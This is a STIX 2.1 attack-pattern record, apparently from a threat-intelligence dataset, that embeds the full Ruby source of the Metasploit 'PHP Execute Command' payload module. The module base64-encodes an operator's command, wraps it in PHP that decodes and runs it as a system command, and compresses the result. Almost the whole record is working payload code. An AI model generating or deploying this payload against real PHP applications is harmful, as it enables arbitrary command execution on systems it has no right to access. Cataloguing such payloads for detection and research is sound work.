{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b9380db-5f53-4142-9a61-1805dd5b04ed",
    "created": "2024-08-14T16:33:19.292086Z",
    "modified": "2024-08-14T16:33:19.29209Z",
    "name": "PHP Execute Command ",
    "description": "Execute a single system command",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/php/exec.rb",
            "external_id": "exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Php\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'PHP Execute Command ',\n      'Description'   => 'Execute a single system command',\n      'Author'        => [ 'egypt' ],\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'php',\n      'Arch'          => ARCH_PHP\n      ))\n    register_options(\n      [\n        OptString.new('CMD', [ true, \"The command string to execute\" ]),\n      ])\n  end\n\n  def php_exec_cmd\n\n    cmd = Rex::Text.encode_base64(datastore['CMD'])\n    dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)\n    shell = <<-END_OF_PHP_CODE\n    #{php_preamble(disabled_varname: dis)}\n    $c = base64_decode(\"#{cmd}\");\n    #{php_system_block(cmd_varname: \"$c\", disabled_varname: dis)}\n    END_OF_PHP_CODE\n\n    return Rex::Text.compress(shell)\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    return php_exec_cmd\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}